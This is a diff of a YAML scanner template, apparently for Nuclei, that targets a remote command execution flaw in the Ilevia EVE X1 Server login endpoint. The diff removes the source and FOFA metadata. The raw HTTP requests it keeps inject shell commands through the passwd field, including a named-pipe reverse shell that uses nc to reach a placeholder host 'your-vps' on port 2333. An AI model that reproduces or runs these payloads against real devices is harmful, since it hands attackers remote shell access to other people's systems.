@@ -3,12 +3,8 @@ info:
   name: IleviaEVEX1Server login存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nrhn5ig7728eamv8'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nrhn5ig7728eamv8
-    fofa: app="ilevia-EVE-X1-Server"
 http:
 - raw:
   - 'POST /ajax/php/login.php HTTP/1.1
@@ -23,8 +19,6 @@ http:
     userid=george&passwd=;id;
 
     Err一定是1才是正确返回
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755324040599-44191efc-0098-400f-aa18-546ba3da9a0d.png)
 
 
     Exp'
@@ -43,10 +37,7 @@ http:
     Content-Length: 140
 
 
-    userid=george&passwd=;mknod+/tmp/pipe+p;+/bin/sh+-i+</tmp/pipe+|+nc+your-vps+2333+>/tmp/pipe
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755324040812-7bc7eeeb-8c61-4e89-8d24-eeec4bf24dad.png)'
+    userid=george&passwd=;mknod+/tmp/pipe+p;+/bin/sh+-i+</tmp/pipe+|+nc+your-vps+2333+>/tmp/pipe'
   redirects: false
   matchers:
   - status:
